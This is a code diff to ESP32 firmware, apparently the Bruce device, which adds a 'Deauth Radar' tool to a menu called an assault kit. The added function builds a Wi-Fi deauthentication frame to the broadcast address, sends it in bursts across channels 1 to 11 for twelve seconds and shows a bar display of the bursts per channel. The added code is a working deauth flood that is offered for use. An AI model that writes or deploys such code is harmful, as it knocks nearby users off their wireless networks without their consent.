@@ -59,6 +59,32 @@ void mopieAssaultKit() {
                 vTaskDelay(12);
             }
         }},
+        {"Deauth Radar",  "channel sweep w/ live bars", []() {
+            // Mopie-owned: hop ch1-11 broadcasting deauth, draw a live 11-bar
+            // radar (each bar = deauth bursts fired on that channel).
+            uint8_t ap[6] = {0x02,0,0,0,0,0}, df[26], bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+            mopie_build_deauth(df, ap, bc, 0x0001);
+            tft.fillScreen(bruceConfig.bgColor);
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            tft.drawCentreString("DEAUTH RADAR", tftWidth/2, 8, 1);
+            tft.drawString("ch:", 4, 22, 1);
+            tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
+            int counts[12] = {0};
+            unsigned long t0 = millis();
+            uint8_t ch = 1;
+            while (!check(EscPress) && millis()-t0 < 12000) {
+                mopie_send_raw(df, sizeof(df), ch, 3);   // burst
+                counts[ch]++;
+                // spectral bar for current channel
+                int h = 26 + (counts[ch] % 40);
+                if (h > 72) h = 72;
+                tft.fillRect(26 + (ch-1)*17, 70 - h, 14, h, bruceConfig.priColor);
+                tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
+                tft.drawCentreString(String(ch), 33 + (ch-1)*17, 78, 1);
+                ch = (ch % 11) + 1;
+                vTaskDelay(55);
+            }
+        }},
     };
     const int N = sizeof(tools)/sizeof(tools[0]);
     int sel = 0;
